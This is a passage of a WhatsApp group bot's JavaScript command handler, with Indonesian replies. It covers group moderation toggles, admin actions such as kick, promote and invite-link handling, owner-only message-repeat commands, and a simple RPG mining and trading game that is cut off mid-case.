zyren.sendButMessage(m.chat, `MODE ANTI ASING`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antitag":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiTag == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antitag = true
setReply("Mode anti tag telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiTag == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antitag = false
setReply("Mode anti tag telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI TAG`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antidelete":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiDelete == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antidelete = true
setReply("Mode anti delete telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiDelete == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antidelete = false
setReply("Mode anti delete telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI DELETE`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antiviewonce":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiViewOnce == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antiviewonce = true
setReply("Mode anti view once telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiViewOnce == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antiviewonce = false
setReply("Mode anti view once telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI VIEW ONCE`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antitoxic":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiToxic == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antitoxic = true
setReply("Mode anti toxic telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiToxic == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antitoxic = false
setReply("Mode anti toxic telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI TOXIC`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antisange":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiSange == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antisange = true
setReply("Mode anti sange telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiSange == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antisange = false
setReply("Mode anti sange telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI SANGE`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "nsfw":
if (!m.isGroup) return onlyGroup()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiNsfw == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antinsfw = true
setReply("Mode Nsfw Telah Aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiNsfw == false) return setReply("Sudah Nonaktif")
db.data.chats[m.chat].antinsfw = false
setReply("Mode Nsfw Telah Nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE NSFW`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "autorespongc":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAutoResponGroup == true) return setReply("Sudah aktif")
db.data.chats[m.chat].autorespongc = true
setReply("Mode auto respon group telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAutoResponGroup == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].autorespongc = false
setReply("Mode auto respon group telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO RESPON GROUP`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "autoreact":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAutoReact == true) return setReply("Sudah aktif")
db.data.chats[m.chat].autoreact = true
setReply("Mode auto react telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAutoReact == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].autoreact = false
setReply("Mode auto react telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO REACT`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "mute":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isCreator && !m.key.fromMe) return onlyOwner()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isBanchat == true) return setReply("Sudah aktif")
db.data.chats[m.chat].mute = true
setReply("Berhasil mute group")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isBanchat == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].mute = false
setReply("Berhasil unmute group")
} else {
zyren.sendButMessage(m.chat, `MODE MUTE`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "welcome":
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isWelcome == true) return setReply("Sudah aktif")
db.data.chats[m.chat].welcome = true
setReply("Welcome telah aktif di group ini")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isWelcome == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].welcome = false
setReply("Welcome telah nonaktif di group ini")
} else {
zyren.sendButMessage(m.chat, `MODE WELCOME`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "linkgroup": case "linkgc": {
if (isBan) return //sticBanLu(from)
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
let response = await zyren.groupInviteCode(m.chat)
setReply("https://chat.whatsapp.com/" + response) 
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw onlyGroup()
                if (!isBotAdmins) throw onlyBadmin()
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await zyren.downloadAndSaveMediaMessage(quoted)
                try {
                if (args[0] == "/full") {
                const { generateProfilePicture } = require("./basetzy/lib/myfunc")
                var { img } = await generateProfilePicture(media)
                await zyren.query({ tag: 'iq',  attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
                } else { await zyren.updateProfilePicture(m.chat, { url: media }) }
                setReply('Sukses')
                } catch { setReply('Gagal Mengganti Photo Profile') }
                }
                break
//=================================================//
case "setnamegc": case "setsubject": {
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (!text) return setReply("Text?") 
await zyren.groupUpdateSubject(m.chat, text).then((res) => setReply(`Sukses mengganti nama group dengan ${text}`)).catch((err) => setReply(jsonformat(err)))
}
break
//=================================================//
case "setdesc": case "setdesk": {
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (!text) return setReply("Text?")
await zyren.groupUpdateDescription(m.chat, text).then((res) => setReply(`Sukses mengganti deskripsi group dengan ${text}`)).catch((err) => setReply(jsonformat(err)))
}
break
//=================================================//
case "gc": case "group":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] == "close") {
zyren.groupSettingUpdate(m.chat, "announcement").then((res) => setReply(`Sukses Menutup Group`)).catch((err) => setReply(jsonformat(err)))
} else if (args[0] == "open") {
zyren.groupSettingUpdate(m.chat, "not_announcement").then((res) => setReply(`Sukses Membuka Group`)).catch((err) => setReply(jsonformat(err)))
} else {
zyren.sendButMessage(m.chat, `GROUP OPEN/CLOSE`, copyright, [
{ buttonId: `${prefix + command} open`, buttonText: { displayText: "𝙾𝙿𝙴𝙽" }, type: 1 },
{ buttonId: `${prefix + command} close`, buttonText: { displayText: "𝙲𝙻𝙾𝚂𝙴" }, type: 1 }], m)
}
break
//=================================================//
case "revoke":{
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
await zyren.groupRevokeInvite(m.chat).then((res) => setReply(`Sukses ritset link group`)).catch((err) => setReply(jsonformat(err)))
}
break
//=================================================//
case "hidetag":{
if (!m.isGroup) return onlyGroup()
if (!isAdmins && !isCreator) return onlyAdmin()
let mem = participants.map((x) => x.id)
zyren.sendMessage(m.chat, { text: text ? text : "", mentions: mem })
}
break
//=================================================//
case "tagall":{
if (!m.isGroup) return onlyGroup()
let member = participants.map((x) => x.id)
let teks = `\`\`\`「  TAG ALL  」\`\`\`

*Message : ${text ? text : "no message"}*\n\n`
for (let x of member) {
teks += `» @${x.split("@")[0]}\n`
}
setReply(teks) 
}
break
//=================================================//
case "add":{
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (Input.startsWith("08")) return setReply("Gunakan kode negara!")
await zyren.groupParticipantsUpdate(m.chat, [Input], "add").then((res) => setReply(`Berhasil menambahkan ${Input.split("@")[0]} di group ${groupName}`)).catch((err) => setReply(jsonformat(err)))
}
break
//=================================================//
case "kick":{
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (Input.startsWith("08")) return setReply("Gunakan kode negara!")
await zyren.groupParticipantsUpdate(m.chat, [Input], "remove").then((res) => setReply(`Berhasil mengeluarkan ${Input.split("@")[0]} di group ${groupName}`)).catch((err) => setReply(jsonformat(err)))
}
break
//=================================================//
case "promote":{
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (Input.startsWith("08")) return setReply("Gunakan kode negara!")
await zyren.groupParticipantsUpdate(m.chat, [Input], "promote").then((res) => setReply(`Berhasil promote ${Input.split("@")[0]} di group ${groupName}`)).catch((err) => setReply(jsonformat(err)))
}
break
//=================================================//
case "demote":{
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (Input.startsWith("08")) return setReply("Gunakan kode negara!")
await zyren.groupParticipantsUpdate(m.chat, [Input], "demote").then((res) => setReply(`Berhasil demote ${Input.split("@")[0]} di group ${groupName}`)).catch((err) => setReply(jsonformat(err)))
}
break
//=================================================//
case "opentime":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] == "seconds" && !args[1]) {
require("../basetzy/group/indexDetik")(zyren, m, prefix, command)
} else if (args[0] == "minutes" && !args[1]) {
require("../basetzy/group/indexMenit")(zyren, m, prefix, command)
} else if (args[0] == "hours" && !args[1]) {
require("../basetzy/group/indexJam")(zyren, m, prefix, command)
} else if (args[0] == "days" && !args[1]) {
require("../basetzy/group/indexHari")(zyren, m, prefix, command)
} else if (args[0] && args[1]) {
setTimeout(() => {
zyren.groupSettingUpdate(m.chat, "announcement")
}, args[1])
zyren.groupSettingUpdate(m.chat, "not_announcement")
setReply("Open time di mulai dari sekarang")
} else {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: "DETIK", rowId: `${prefix + command} seconds`, description: `${command.toUpperCase()} DETIK`},
{title: "MENIT", rowId: `${prefix + command} minutes`, description: `${command.toUpperCase()} MENIT`},
{title: "JAM", rowId: `${prefix + command} hours`, description: `${command.toUpperCase()} JAM`},
{title: "HARI", rowId: `${prefix + command} days`, description: `${command.toUpperCase()} HARI`},
]}]
const listMessage = { text: `${command.toUpperCase()}`, buttonText: "Click Here", sections }
zyren.sendMessage(m.chat, listMessage, { quoted: m })
}
break
//=================================================//
case "closetime":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] == "seconds" && !args[1]) {
require("../basetzy/group/indexDetik")(zyren, m, prefix, command)
} else if (args[0] == "minutes" && !args[1]) {
require("../basetzy/group/indexMenit")(zyren, m, prefix, command)
} else if (args[0] == "hours" && !args[1]) {
require("../basetzy/group/indexJam")(zyren, m, prefix, command)
} else if (args[0] == "days" && !args[1]) {
require("../basetzy/group/indexHari")(zyren, m, prefix, command)
} else if (args[0] && args[1]) {
setTimeout(() => {
zyren.groupSettingUpdate(m.chat, "not_announcement")
}, args[1])
zyren.groupSettingUpdate(m.chat, "announcement")
setReply("Close time di mulai dari sekarang")
} else {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: "DETIK", rowId: `${prefix + command} seconds`, description: `${command.toUpperCase()} DETIK`},
{title: "MENIT", rowId: `${prefix + command} minutes`, description: `${command.toUpperCase()} MENIT`},
{title: "JAM", rowId: `${prefix + command} hours`, description: `${command.toUpperCase()} JAM`},
{title: "HARI", rowId: `${prefix + command} days`, description: `${command.toUpperCase()} HARI`},
]}]
const listMessage = { text: `${command.toUpperCase()}`, buttonText: "Click Here", sections }
zyren.sendMessage(m.chat, listMessage, { quoted: m })
}
break
//=================================================//
case "disappearing":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (text == "off") {
zyren.sendMessage(m.chat, { disappearingMessagesInChat: 0 })
} else if (text == "24 hours") {
zyren.sendMessage(m.chat, { disappearingMessagesInChat: 86400 })
} else if (text == "7 days") {
zyren.sendMessage(m.chat, { disappearingMessagesInChat: 604800 })
} else if (text == "90 days") {
zyren.sendMessage(m.chat, { disappearingMessagesInChat: 7776000 })
} else {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: `OFF`, rowId: `${prefix + command} off`, description: `TYPE OFF`},
{title: `24 JAM`, rowId: `${prefix + command} 24 hours`, description: `TYPE 24 JAM`},
{title: `7 HARI`, rowId: `${prefix + command} 7 days`, description: `TYPE 7 HARI`},
{title: `90 HARI`, rowId: `${prefix + command} 90 days`, description: `TYPE 90 HARI`},
]}]
const listMessage = { text: `MESSAGE TIMER`, buttonText: "Click Here", sections }
zyren.sendMessage(m.chat, listMessage, { quoted: m })
} 
break
//=================================================//
case "editinfo": 
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "member"){
await zyren.groupSettingUpdate(m.chat, "unlocked").then((res) => setReply(`Sukses Membuka Edit Info Group`)).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === "admin"){
await zyren.groupSettingUpdate(m.chat, "locked").then((res) => setReply(`Sukses Menutup Edit Info Group`)).catch((err) => setReply(jsonformat(err)))
} else {
zyren.sendButMessage(m.chat, `EDIT INFO GROUP`, copyright, [
{ buttonId: `${prefix + command} member`, buttonText: { displayText: "MEMBER" }, type: 1 },
{ buttonId: `${prefix + command} admin`, buttonText: { displayText: "ADMIN" }, type: 1 }], m)
}
break
//=================================================//
case "inspect":{
if (text) {
if (!text.includes("https://chat.whatsapp.com/")) return setReply("Itu Bukan Link Group Kak")
const ano = text.split("https://chat.whatsapp.com/")[1]
const nana = await zyren.groupAcceptInvite(ano)
const groupMetadata2 = await zyren.groupMetadata(nana).catch(e => {})
const participants2 = await groupMetadata2.participants
const groupAdmins2 = await participants2.filter(v => v.admin !== null).map(v => v.id)
if (groupAdmins2.includes(botNumber)) {
let response = await zyren.groupInviteCode(nana)
var linkGc = "https://chat.whatsapp.com/" + response
} else {
var linkGc = "Botz Is Not Admin"
}
let teks = `\`\`\`「  INFO GROUP  」\`\`\`

▸ Name : ${groupMetadata2.subject}
▸ Owner : @${groupMetadata2.owner.split("@")[0]}
▸ Creation : ${moment(groupMetadata2.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Total Members : ${participants2.length}
▸ Total Admins : ${groupAdmins2.length}
▸ Link : ${linkGc}
`
setReply(teks) 
} else {
if (!m.isGroup) return onlyGroup()
if (isBotAdmins) {
let response = await zyren.groupInviteCode(m.chat)
var linkGc = "https://chat.whatsapp.com/" + response
} else {
var linkGc = "Botz Is Not Admin"
}
let teks = `\`\`\`「  INFO GROUP  」\`\`\`

▸ Name : ${groupMetadata.subject}
▸ Owner : @${groupMetadata.owner.split("@")[0]}
▸ Creation : ${moment(groupMetadata.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Total Members : ${participants.length}
▸ Total Admins : ${groupAdmins.length}
▸ Link : ${linkGc}
`
setReply(teks) 
}
}
break
//=================================================//




case "spamv": {
if (!isCreator) return onlyOwner()
if (!m.quoted) return setReply("Reply pesanya!")
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
quoted.copyNForward(m.chat, true)
}
} 
break
case "spam": {
if (!isCreator) return onlyOwner()
if (!m.quoted) return setReply("Reply pesanya!")
if (!args[0]) return setReply("Masukan jumlah spamnya")
if (!Number(args[0])) return setReply("Hanya angka")
let jml = args[0]
if (isCreator) {
await sleep(100)
for(let i=0;i<jml;i++){
quoted.copyNForward(m.chat, true)
}
} else if (isAdmins) {
if (args[0] > 100) return setReply("Maximal 100")
await sleep(100)
for(let i=0;i<jml;i++){
quoted.copyNForward(m.chat, true)
}
} else {
setReply("Hanya Bisa Digunakan Oleh Admin Group Atau Owner Bot")
}
}
break
//=================================================//
//═══════════[ Rpg Menu ]═══════════\\

 //cr thunder
case "inventori": case "inventory": case "profile":{
let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*❤ ️•Darah kamu:* ${db.data.users[m.sender].darah}\n`
teksehmazeh += `*◻️️ •Besi kamu:* ${db.data.users[m.sender].besi}\n`
teksehmazeh += `*🌟 •Emas Kamu:* ${db.data.users[m.sender].emas}\n`
teksehmazeh += `*❇️ •Emerald Kamu:* ${db.data.users[m.sender].emerald}\n`
teksehmazeh += `*⏺ •️Limit kamu:* ${db.data.users[m.sender].limit}\n`
teksehmazeh += `*🧪 •Potion Kamu:* ${db.data.users[m.sender].potion}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*🐟 •Ikan:* ${db.data.users[m.sender].ikan}\n`
teksehmazeh += `*🐔 •Ayam:* ${db.data.users[m.sender].ayam}\n`
teksehmazeh += `*🐇 •Kelinci:* ${db.data.users[m.sender].kelinci}\n`
teksehmazeh += `*🐑 •Domba:* ${db.data.users[m.sender].domba}\n`
teksehmazeh += `*🐄 •Sapi:* ${db.data.users[m.sender].sapi}\n`
teksehmazeh += `*🐘 •Gajah:* ${db.data.users[m.sender].gajah}\n\n`
setReply(teksehmazeh)
}
break
 case "leaderboard":
{ 
let txt = `「 *LEADERBOARD* 」\n\n`
for (let x of Object.keys(db.data.users)){
txt += `➸ *Name :* ${db.data.users[x].name}\n`
txt += `*🐟 Ikan* : ${db.data.users[x].ikan}\n`
txt += `*🐔 Ayam* : ${db.data.users[x].ayam}\n`
txt += `*🐇 Kelinci* : ${db.data.users[x].kelinci}\n`
txt += `*🐑 Domba* : ${db.data.users[x].domba}\n`
txt += `*🐄 Sapi* : ${db.data.users[x].sapi}\n`
txt += `*🐘 Gajah* : ${db.data.users[x].gajah}\n\n`
}
setReply(txt)
}
 break
case "mining": case "mine":{
if (db.data.users[m.sender].darah < 1) return setReply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: "Menambang Lagi ⛏️"
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: "./media/gambarnye/rpg/tambang.jpg" },
 caption: caption,
 footer: copyright,
 buttons: buttons,
 headerType: 4
}
zyren.sendMessage(from, buttonMessage, { quoted: m })

}, 7000)
setTimeout( () => {
setReply(`${pushname} Mulai Menambang⛏️`)
}, 1500)
db.data.users[m.sender].darah -= 10
db.data.users[m.sender].besi += besinya
db.data.users[m.sender].emas += emasnya
db.data.users[m.sender].emerald += emeraldnya
}
break
//transaksi
case "beli": case "buy":{
if (!q) return setReply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
var anu = args[1]
if (args[0] === "potion"){
let noh = 100000 * anu
if (!args[1]) return setReply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
if (db.data.users[m.sender].monay < noh) return setReply("Uang mu tidak mencukupi")
db.data.users[m.sender].monay -= noh
var apalu = anu * 1
db.data.users[m.sender].potion += apalu
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Potion Mu:* ${db.data.users[m.sender].potion}`)
}, 2000) 
} else if (args[0] === "baitfood"){
let noh = 5000 * anu
if (!args[1]) return setReply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
if (db.data.users[m.sender].monay < noh) return setReply("Uang mu tidak mencukupi")
db.data.users[m.sender].monay -= noh
var apalu = anu * 1
db.data.users[m.sender].umpan += apalu
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Bait Food Mu:* ${db.data.users[m.sender].umpan}`)
}, 2000) 
} else 
if (args[0] === "limit"){
let noh = 35000 * anu
if (!args[1]) return setReply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
if (db.data.users[m.sender].monay < noh) return setReply("Uang mu tidak mencukupi")
db.data.users[m.sender].monay -= noh
var apalu = anu * 1
db.data.users[m.sender].limit += apalu
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Your Limit* : ${db.data.users[m.sender].limit}`)
}, 2000) 
} else { setReply("Incorrect Format!") }
 }
 break
 
case "sell": case "jual":{
if (!q) return setReply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
var anu = args[1]
if (args[0] === "fish"){
if (db.data.users[m.sender].ikan < anu) return setReply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
if (!args[1]) return setReply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
db.data.users[m.sender].ikan -= anu
let monaynya = 1500 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Ikan Mu:* ${db.data.users[m.sender].ikan}`)
}, 2000) 
} else if (args[0] === "chicken"){
if (db.data.users[m.sender].ayam < anu) return setReply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
if (!args[1]) return setReply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
db.data.users[m.sender].ayam -= anu
let monaynya = 2500 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Ayam Mu:* ${db.data.users[m.sender].ayam}`)
}, 2000) 
} else if (args[0] === "rabbit"){
if (db.data.users[m.sender].kelinci < anu) return setReply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
if (!args[1]) return setReply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
db.data.users[m.sender].kelinci -= anu
let monaynya = 3000 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Kelinci Mu:* ${db.data.users[m.sender].kelinci}`)
}, 2000) 
} else if (args[0] === "sheep"){
if (db.data.users[m.sender].domba < anu) return setReply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
if (!args[1]) return setReply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
db.data.users[m.sender].domba -= anu
let monaynya = 5000 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Domba Mu:* ${db.data.users[m.sender].domba}`)
}, 2000) 
} else if (args[0] === "cow"){
if (db.data.users[m.sender].sapi < anu) return setReply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
if (!args[1]) return setReply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
db.data.users[m.sender].sapi -= anu
let monaynya = 10000 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Sapi Mu:* ${db.data.users[m.sender].sapi}`)
}, 2000) 
} else if (args[0] === "elephant") {
if (db.data.users[m.sender].gajah < anu) return setReply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
if (!args[1]) return setReply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
db.data.users[m.sender].gajah -= anu
let monaynya = 15000 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Gajahmu:* ${db.data.users[m.sender].gajah}`)
}, 2000) 
} else if (args[0] === "iron") {
if (db.data.users[m.sender].besi < anu) return setReply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
if (!args[1]) return setReply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
db.data.users[m.sender].besi -= anu
let monaynya = 16000 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Besi Mu:* ${db.data.users[m.sender].besi}`)
}, 2000) 
} else if (args[0] === "gold"){
if (db.data.users[m.sender].emas < anu) return setReply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
